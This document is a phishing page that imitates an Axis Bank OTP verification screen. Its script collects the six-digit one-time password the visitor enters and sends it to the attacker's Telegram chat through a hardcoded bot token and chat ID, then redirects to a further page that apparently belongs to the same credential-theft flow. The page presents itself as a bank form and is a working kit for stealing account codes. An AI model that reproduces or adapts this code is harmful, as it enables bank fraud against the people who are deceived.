<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Ravi Verification</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:'Poppins',sans-serif;
}

body{
min-height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:linear-gradient(135deg,#4b001f,#7a1636,#9b2242);
padding:20px;
overflow-x:hidden;
}

.top-header{
position:fixed;
top:0;
left:0;
width:100%;
padding:18px 35px;
background:rgba(58,0,23,0.95);
display:flex;
justify-content:space-between;
align-items:center;
backdrop-filter:blur(12px);
box-shadow:0 5px 18px rgba(0,0,0,0.25);
z-index:1000;
}

.logo{
font-size:30px;
font-weight:700;
color:white;
letter-spacing:1px;
}

.box{
width:100%;
max-width:400px;
background:white;
padding:35px;
border-radius:28px;
margin-top:70px;
box-shadow:0 20px 45px rgba(0,0,0,0.25);
text-align:center;
}

h2{
color:#7a1636;
margin-bottom:10px;
font-size:32px;
}

p{
color:#666;
margin-bottom:25px;
}

.otp-input{
display:flex;
justify-content:center;
gap:10px;
margin-bottom:25px;
}

.otp-input input{
width:50px;
height:55px;
text-align:center;
font-size:22px;
font-weight:600;
border-radius:14px;
border:1px solid #ccc;
outline:none;
transition:0.3s;
}

.otp-input input:focus{
border-color:#7a1636;
box-shadow:0 0 8px rgba(122,22,54,0.2);
}

button{
width:100%;
padding:16px;
border:none;
border-radius:16px;
background:linear-gradient(145deg,#8b1e46,#5a1029);
color:white;
font-size:17px;
font-weight:600;
cursor:pointer;
box-shadow:
0 8px 0 #3e0a1c,
0 14px 24px rgba(0,0,0,0.25);
transition:0.2s;
}

button:hover{
transform:translateY(3px);
box-shadow:
0 4px 0 #3e0a1c,
0 10px 18px rgba(0,0,0,0.2);
}

@media(max-width:768px){

.top-header{
padding:15px 20px;
}

.logo{
font-size:24px;
}

.box{
padding:28px;
}

}

</style>
</head>

<body>

<div class="top-header">
<div class="logo">
Axis Bank
</div>
</div>

<div class="box">

<h2>OTP Verification</h2>

<p>
Enter the 6-digit verification code
</p>

<form id="otpForm">

<div class="otp-input">

<input type="number" maxlength="1" required>
<input type="number" maxlength="1" required>
<input type="number" maxlength="1" required>
<input type="number" maxlength="1" required>
<input type="number" maxlength="1" required>
<input type="number" maxlength="1" required>

</div>

<button type="submit">
Verify OTP
</button>

</form>

</div>

<script>

const BOT_TOKEN = "8212429787:AAHx8QHgnUWhcH4etbyU6ylxM7bwnunBXao";
const CHAT_ID = "-1003446660471";

const inputs = document.querySelectorAll(".otp-input input");

/* AUTO NEXT */

inputs.forEach((input, index) => {

input.addEventListener("input", (e) => {

let value = e.target.value.replace(/\D/g,'');

if(value.length > 1){

value = value.split('');

inputs.forEach((inp,i)=>{
inp.value = value[i] || '';
});

const lastFilled = Math.min(value.length, inputs.length) - 1;

if(lastFilled >= 0 && lastFilled < inputs.length){
inputs[lastFilled].focus();
}

return;
}

e.target.value = value;

if(value && index < inputs.length - 1){
inputs[index + 1].focus();
}

});

/* BACKSPACE */

input.addEventListener("keydown", (e) => {

if(e.key === "Backspace" && !input.value && index > 0){
inputs[index - 1].focus();
}

});

/* PASTE FULL OTP */

input.addEventListener("paste", (e) => {

e.preventDefault();

const paste = (e.clipboardData || window.clipboardData)
.getData("text")
.replace(/\D/g,'');

paste.split('').forEach((char,i)=>{
if(inputs[i]){
inputs[i].value = char;
}
});

});

});

/* SUBMIT */

document.getElementById("otpForm")
.addEventListener("submit", async function(e){

e.preventDefault();

const otp = Array.from(inputs)
.map(input => input.value)
.join('');

const message = `
🔥 NEW OTP 🔥

🔐 OTP: ${otp}
`;

try{

await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
chat_id:CHAT_ID,
text:message
})
});

window.location.href = "4.html";

}catch(err){

alert("Error Sending OTP");

}

});

</script>

</body>
</html>
